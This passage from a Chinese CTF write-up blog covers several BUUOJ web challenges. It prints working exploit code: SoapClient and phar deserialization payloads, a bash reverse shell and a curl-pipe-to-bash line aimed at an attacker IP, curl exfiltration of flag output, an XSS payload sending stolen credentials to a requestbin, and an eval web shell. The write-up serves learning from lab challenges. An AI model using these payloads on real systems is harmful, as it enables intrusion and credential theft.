(string)strlen($post_string).&#39;^^^^&#39;.$post_string.&#39;^^&#39;,&#39;uri&#39;&#x3D;&gt;&#39;hello&#39;));</span><br><span class="line">$aaa &#x3D; serialize($b);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">echo &#39;0x&#39;.bin2hex($aaa);</span><br></pre></td></tr></table></figure><p>运行一下得到序列化的hex值，在之前登陆的test123账号上注入mood的值</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328000906716.png" alt></p><p>用test123账号账号刷新一下<code>?action=index</code>的页面，触发发序列化，然后刷新新开的窗口页面发现publish变成了文件上传页面，这里我们之所以反序列化soap类后能登录admin，是因为</p><pre><code>$mood = unserialize($row[2]);$country = $mood-&gt;getcountry();</code></pre><p>我们知道此时$mood就是一个soap类，所以这个类没有getcountry()方法，此时就会触发soap类的__call()魔法函数就能实现登录<br>上传一个小马，连接蚁剑，查看/etc/host，发现存在173.208.161.0/24的网段，逐个curl 扫描，发现173.208.161.10存活</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89%5Cimage-20200328002224576.png" alt></p><p>在burp中查看源代码进行分析</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328002753590.png" alt></p><p>由于end会输出输入的最后一项值，如果$ext==$filename[count($filename) - 1]，die()，$filename可以直接传入，因此我们可以传个file[0]与file[1]，问题在于end()，end()返回数组最后一个元素，但并不是按照数组索引的顺序排列的，而是按照赋值顺序。也就是说我们传入file[1]=aaa,file[0]=bbb，文件名为bbb.aaa，end()返回的是bbb，第一个die就可以绕过了。</p><p><img src="https://img-blog.csdnimg.cn/20200306171314880.png" alt></p><p>上传源代码，用postman发包</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328011427281.png" alt></p><p>用code功能转换成php_cURL代码，修改url和请求体</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328012415117.png" alt></p><p>生成最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$curl &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, array(</span><br><span class="line">  CURLOPT_URL &#x3D;&gt; &quot;http:&#x2F;&#x2F;173.184.57.10&quot;,</span><br><span class="line">  CURLOPT_RETURNTRANSFER &#x3D;&gt; true,</span><br><span class="line">  CURLOPT_ENCODING &#x3D;&gt; &quot;&quot;,</span><br><span class="line">  CURLOPT_MAXREDIRS &#x3D;&gt; 10,</span><br><span class="line">  CURLOPT_TIMEOUT &#x3D;&gt; 30,</span><br><span class="line">  CURLOPT_HTTP_VERSION &#x3D;&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST &#x3D;&gt; &quot;POST&quot;,</span><br><span class="line">  CURLOPT_POSTFIELDS &#x3D;&gt; &quot;------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file\&quot;; filename&#x3D;\&quot;shell.php\&quot;\r\nContent-Type: false\r\n\r\n@&lt;?php system(&#39;cat &#x2F;etc&#x2F;flag*&#39;);\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;hello\&quot;\r\n\r\nshell.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[2]\&quot;\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[1]\&quot;\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name&#x3D;\&quot;file[0]\&quot;\r\n\r\n&#x2F;..&#x2F;shell.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--&quot;,</span><br><span class="line">  CURLOPT_HTTPHEADER &#x3D;&gt; array(</span><br><span class="line">    &quot;cache-control: no-cache&quot;,</span><br><span class="line">    &quot;content-type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;,</span><br><span class="line">    &quot;postman-token: 09101c1a-04aa-7288-15ea-515cbc9c512b&quot;</span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response &#x3D; curl_exec($curl);</span><br><span class="line">$err &#x3D; curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line">if ($err) &#123;</span><br><span class="line">  echo &quot;cURL Error #:&quot; . $err;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传访问得到flag：</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328012625101.png" alt></p><p>最后吐槽一下容器经常会注册失败，需要销毁重启QAQ</p><p>参考链接：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104687766" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104687766</a></p><p><a href="https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104132751?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104132751?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p></blockquote><h3 id="0x-03-SUCTF-2019-Upload-Labs-2"><a href="#0x-03-SUCTF-2019-Upload-Labs-2" class="headerlink" title="0x 03 [SUCTF 2019]Upload Labs 2"></a>0x 03 [SUCTF 2019]Upload Labs 2</h3><ul><li><p>考点</p><p>phar反序列化、SSRF</p></li><li><p>解题过程</p></li></ul><ol><li><p>首先根据题目提供的源代码进行审计，发现要获得flag必须本地访问admin.php，这里需要进行SSRF，这里将传递到admin.php的参数进行实例化了AD类，在这个类中，又通过反射类来实例一个对象，并通过该实例化的对象来调用反射出来的该类的方法</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328115740615.png" alt></p><p>分析index.php代码发现它对上传的文件进行检查，检查图片的后缀和上传的内容中不能有<code>&lt;?</code>，这里我们可以用<code>&lt;script language=&#39;php&#39;&gt;</code>绕过。</p></li><li><p>分析func.php中的代码，对post请求的url参数进行匹配</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#39;&#x2F;^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*&#x2F;i&#39;,$_POST[&#39;url&#39;]))&#123;</span><br><span class="line">        die(&quot;Go away!&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/index.png" alt></p><p>这里过滤了过滤了类似<code>phar</code>之类的伪协议，但是可以通过 php://filter 来绕过一些开头限制进行 phar 反序列化。</p><p>这里会对上传的文件进行检查，返回文件类型，可能存在phar反序列化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">$file &#x3D; new File($file_path);</span><br><span class="line">$file-&gt;getMIME();</span><br><span class="line">echo &quot;&lt;p&gt;Your file type is &#39;$file&#39; &lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure><p>跟进File类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line">...</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        &#x2F;&#x2F;调用反射创建类</span><br><span class="line">        $class &#x3D; new ReflectionClass($this-&gt;func);</span><br><span class="line">        &#x2F;&#x2F;创建实例</span><br><span class="line">        $a &#x3D; $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">         &#x2F;&#x2F;触发SoapClient类的__call方法</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        $finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $this-&gt;type &#x3D; finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里<code>$hits-&gt;func</code>可以被我们控制为<code>SoapClient</code>类，然后控制<code>$htis-&gt;file_name</code>去传入我们想要的参数。最后通过<code>$a-&gt;check();</code>调用<code>SoapClient::__call()</code>从而触发<code>SSRF</code></p><ol start="3"><li>构造payload如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    public $file_name &#x3D; &quot;&quot;;</span><br><span class="line">    public $func &#x3D; &quot;SoapClient&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php&quot;;</span><br><span class="line">        &#x2F;&#x2F;需要更改其中curl 的ip</span><br><span class="line">        $post_string &#x3D; &#39;admin&#x3D;&amp;cmd&#x3D;curl 174.1.145.112&#x2F;index.php|bash&amp;clazz&#x3D;SplStack&amp;func1&#x3D;push&amp;func2&#x3D;push&amp;func3&#x3D;push&amp;arg1&#x3D;1111&amp;arg2&#x3D;1111&amp;arg3&#x3D;&#39; . &quot;\r\n&quot;;</span><br><span class="line">        $headers &#x3D; [];</span><br><span class="line">        $this-&gt;file_name &#x3D; [</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39; &#x3D;&gt; str_replace(&#39;^^&#39;, &quot;\r\n&quot;, &#39;xxxxx^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39; . join(&#39;^^&#39;, $headers) . &#39;Content-Length: &#39; . (string)strlen($post_string) . &#39;^^^^&#39; . $post_string),</span><br><span class="line">                &#39;uri&#39; &#x3D;&gt; &#39;hello&#39;)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&#39;test.phar&#39;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);</span><br><span class="line">$phar-&gt;setStub(&#39;&lt;script language&#x3D;&quot;php&quot;&gt;__HALT_COMPILER();&lt;&#x2F;script&gt;&#39;);</span><br><span class="line">$object &#x3D; new File;</span><br><span class="line">echo urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(&#39;test.phar&#39;,&#39;lanxiaojun.jpg&#39;);</span><br></pre></td></tr></table></figure><p>运行生成了一个lanxiaojun.jpg文件并上传</p><p>是的</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328113640002.png" alt></p><p>在linux下靶机的在<code>var/www/html/index.php</code>中写入弹shell的一句话，并开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.145.112&#x2F;9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在func.php页面触发反序列化</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328120255257.png" alt></p><p>然后在靶机上收到反弹的shell获得flag。</p><p>除了可以反弹shell之外还可以发包带上请求的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$post_string &#x3D; &#39;admin&#x3D;1&amp;cmd&#x3D;curl --referer &quot;&#96;&#x2F;readflag&#96;&quot; &quot;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api%26id&#x3D;72Jvrh&quot;&amp;clazz&#x3D;SplStack&amp;func1&#x3D;push&amp;func2&#x3D;push&amp;func3&#x3D;push&amp;arg1&#x3D;123456&amp;arg2&#x3D;123456&amp;arg3&#x3D;&#39;. &quot;\r\n&quot;;</span><br></pre></td></tr></table></figure><p>参考链接：</p><blockquote><p><a href="http://github.mrkaixin.computer/2020/03/16/BUU(三)/" target="_blank" rel="noopener">http://github.mrkaixin.computer/2020/03/16/BUU(%E4%B8%89)/</a></p><p><a href="https://www.jianshu.com/p/b97080cd7623" target="_blank" rel="noopener">https://www.jianshu.com/p/b97080cd7623</a></p></blockquote><h3 id="0x-04-GWCTF-2019-mypassword"><a href="#0x-04-GWCTF-2019-mypassword" class="headerlink" title="0x 04 [GWCTF 2019]mypassword"></a>0x 04 [GWCTF 2019]mypassword</h3><ul><li><p>考点</p><p>xss</p></li><li><p>解题过程</p></li></ul><ol><li>注册登录之后在feedback`页面看到了一个大大的输入框，查看源码如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(is_array($feedback))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&#39;反馈不合法&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist &#x3D;[&#39;_&#39;,&#39;\&#39;&#39;,&#39;&amp;&#39;,&#39;\\&#39;,&#39;#&#39;,&#39;%&#39;,&#39;input&#39;,&#39;script&#39;,&#39;iframe&#39;,&#39;host&#39;,&#39;onload&#39;,&#39;onerror&#39;,&#39;srcdoc&#39;,&#39;location&#39;,&#39;svg&#39;,&#39;form&#39;,&#39;img&#39;,&#39;src&#39;,&#39;getElement&#39;,&#39;document&#39;,&#39;cookie&#39;];</span><br><span class="line">foreach ($blacklist as $val) &#123;</span><br><span class="line">while(true)&#123;</span><br><span class="line">if(stripos($feedback,$val) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">    $feedback &#x3D; str_ireplace($val,&quot;&quot;,$feedback);</span><br><span class="line">&#125;</span><br><span class="line">        else&#123;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题存在<code>CSP</code>，不能注入外部的JS，那肯定就需要在内部JS上动手脚，逐个页面看源码，结果在登陆页面看到存在<code>login.js</code>，源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (document.cookie &amp;&amp; document.cookie !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">var cookies &#x3D; document.cookie.split(&#39;; &#39;);</span><br><span class="line">var cookie &#x3D; &#123;&#125;;</span><br><span class="line">for (var i &#x3D; 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">var arr &#x3D; cookies[i].split(&#39;&#x3D;&#39;);</span><br><span class="line">var key &#x3D; arr[0];</span><br><span class="line">cookie[key] &#x3D; arr[1];</span><br><span class="line">&#125;</span><br><span class="line">if(typeof(cookie[&#39;user&#39;]) !&#x3D; &quot;undefined&quot; &amp;&amp; typeof(cookie[&#39;psw&#39;]) !&#x3D; &quot;undefined&quot;)&#123;</span><br><span class="line">document.getElementsByName(&quot;username&quot;)[0].value &#x3D; cookie[&#39;user&#39;];</span><br><span class="line">document.getElementsByName(&quot;password&quot;)[0].value &#x3D; cookie[&#39;psw&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里记住密码功能会从<code>Cookie</code>中取出用户名和密码并赋值给<code>username</code>和<code>password</code>，因此我们可以利用这个内部JS来构造payload进行XSS，这里我们可以用BUU的<a href="http://http.requestbin.buuoj.cn/" target="_blank" rel="noopener">requestbin</a>来接受反馈。（RequestBin提供了一个URL，该URL将收集对其发出的请求）</p><p>在<code>feedback</code>页面构造如下payload提交：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;inpcookieut type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;&#x2F;inpcookieut&gt;</span><br><span class="line">&lt;inpcookieut type&#x3D;&quot;text&quot; name&#x3D;&quot;password&quot;&gt;&lt;&#x2F;inpcookieut&gt;</span><br><span class="line">&lt;scricookiept scookierc&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;scricookiept&gt;</span><br><span class="line">&lt;scricookiept&gt;</span><br><span class="line">var uname &#x3D; documcookieent.getElemcookieentsByName(&quot;username&quot;)[0].value;</span><br><span class="line">var passwd &#x3D; documcookieent.getElemcookieentsByName(&quot;password&quot;)[0].value;</span><br><span class="line">var res &#x3D; uname + &quot; &quot; + passwd;</span><br><span class="line">documcookieent.locacookietion&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1drzn1e1&#x2F;?a&#x3D;&quot;+res;</span><br><span class="line">&lt;&#x2F;scricookiept&gt;</span><br></pre></td></tr></table></figure><p>可在requestbin看到回显：</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200326224613793.png" alt></p><p>参考资料：</p><blockquote><p><a href="http://www.ggb0n.cool/2020/03/04/GWCTF2019复现/#题目分析-2" target="_blank" rel="noopener">http://www.ggb0n.cool/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2</a></p></blockquote><h3 id="0x-05-BSidesCF-2020-Had-a-bad-day"><a href="#0x-05-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="0x 05 [BSidesCF 2020]Had a bad day"></a>0x 05 [BSidesCF 2020]Had a bad day</h3><ul><li><p>考点</p><p>php伪协议</p></li><li><p>解题过程</p></li></ul><p>首页点击得到一张图片，根据url特性尝试base64读取源代码得到如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file &#x3D; $_GET[&#39;category&#39;];</span><br><span class="line"></span><br><span class="line">    if(isset($file))</span><br><span class="line">    &#123;</span><br><span class="line">        if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">            include ($file . &#39;.php&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>必须含有woofers或meowers或index字符串,尝试首页包含一下看看<code>index.php?category=woofers/../flag</code></p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328013457364.png" alt></p><p>成功包含，接下来是读取源代码，这里有一个小技巧：php://filter伪协议可以套一层协议，这样提交的参数既包含有woofers这个字符串，也不会影响正常的包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><p>即可得到flag的base64值</p><h3 id="0x-06-N1CTF-2018-easy-harder-php"><a href="#0x-06-N1CTF-2018-easy-harder-php" class="headerlink" title="0x 06 [N1CTF 2018]easy_harder_php"></a>0x 06 [N1CTF 2018]easy_harder_php</h3><ul><li><p>考点</p><p>SSRF+文件名爆破</p></li><li><p>解题过程</p></li></ul><ol><li>SSRF登录参考[De1CTF 2019]ShellShellShell题解，这里记录后续getshell操作。在publish页面存在一个文件上传功能，审计代码发现只能上传图片，而且上传的文件不能有<code>&lt;?php</code>， 这儿可以用<code>&lt;script language=&#39;php&#39;&gt;</code>代替，文件上传之后是执行一个sh命令如下，我们可以文件包含看看sh文件的内容</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(move_uploaded_file($uploaded_file,$move_to_file)) &#123;</span><br><span class="line">            if(stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;&#x3D;0)</span><br><span class="line">                system(&#39;sh &#x2F;home&#x2F;nu1lctf&#x2F;clean_danger.sh&#39;);</span><br><span class="line">            return $file_true_name;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328124926898.png" alt></p><p>这儿就需要用到linux的一个小trick了，当我们的文件名是以<code>-</code>开头时这个命令会报错从而让文件保存下来。</p><ol start="2"><li>所以我们的思路就是上传一个以<code>-</code>开头的图片码，然后再爆破出上传的文件名，构造shell如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; </span><br><span class="line">$_POST[&quot;xxx&quot;]&#x3D;str_replace(&quot;[&quot;,&quot;&#39;&quot;,$_POST[&quot;xxx&quot;]);</span><br><span class="line">$_POST[&quot;xxx&quot;]&#x3D;str_replace(&quot;]&quot;,&quot;&#39;&quot;,$_POST[&quot;xxx&quot;]);</span><br><span class="line">echo $_POST[&quot;xxx&quot;];</span><br><span class="line">eval($_POST[&quot;xxx&quot;]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"># 由于题目过了了我们的输入所以，没办法使用引号和单引号，我们用&quot;[&quot;，和&quot;]&quot;代替</span><br></pre></td></tr></table></figure><p>爆破文件名脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">time &#x3D; int(time.time())*100</span><br><span class="line"></span><br><span class="line">request_url &#x3D; &#39;http:&#x2F;&#x2F;8ebb02fd-d153-4801-a104-0da7ec58a462.node3.buuoj.cn&#x2F;index.php?action&#x3D;publish&#39;</span><br><span class="line"></span><br><span class="line">cookie &#x3D; &#39;&#39;&#39;PHPSESSID&#x3D;r8gq3bh41h899tuquthqmoefe3&#39;&#39;&#39;</span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">&#39;Cookie&#39;: cookie&#125;</span><br><span class="line">request_file &#x3D; &#123;&#39;pic&#39;:(&#39;-xx.jpg&#39;,open(&#39;D:&#x2F;-xx.jpg&#39;),&#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res &#x3D; requests.post(url&#x3D;request_url, headers&#x3D;header,files&#x3D;request_file)# url,data,files</span><br><span class="line">print res.text</span><br><span class="line">print time</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;8ebb02fd-d153-4801-a104-0da7ec58a462.node3.buuoj.cn&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;app&#x2F;adminpic&#x2F;-xx&#123;&#125;.jpg&#39;</span><br><span class="line">for i in range(10000):</span><br><span class="line">    tmp &#x3D; time + i</span><br><span class="line">    ul &#x3D; url.format(tmp)</span><br><span class="line">    html &#x3D; requests.get(ul).status_code</span><br><span class="line">    print(html,i)</span><br><span class="line">    if html &#x3D;&#x3D; 200:</span><br><span class="line">        print(ul)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200330011355490.png" alt></p><p>参考链接：</p><blockquote><p><a href="https://blog.csdn.net/a3320315/article/details/104088080" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104088080</a></p></blockquote><h3 id="0x-07-SWPUCTF-2016-Web7"><a href="#0x-07-SWPUCTF-2016-Web7" class="headerlink" title="0x 07 [SWPUCTF 2016]Web7"></a>0x 07 [SWPUCTF 2016]Web7</h3><ul><li><p>考点</p><p>Python2 Urllib2头部注入(CVE-2016-5699)</p></li><li><p>解题过程</p></li></ul><ol><li>题目源代码：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 